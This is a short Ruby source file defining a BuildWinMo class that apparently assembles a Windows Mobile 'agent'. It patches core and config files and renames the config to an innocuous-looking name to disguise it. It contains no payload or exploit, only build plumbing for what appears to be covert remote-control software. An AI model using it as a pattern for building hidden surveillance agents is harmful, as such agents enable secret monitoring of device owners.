#
#  Agent creation for winMo
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWinMo < Build

  def initialize
    super
    @platform = 'winmo'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

  end

  def scramble
    trace :debug, "Build: scrambling"

    # the only file that is scrambled on winmo
    config = 'cptm511.dql'

    @scrambled = {config: config}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super

  end

  def melt
    trace :debug, "#{self.class} #{__method__}"
  end

end

end #DB::
end #RCS::
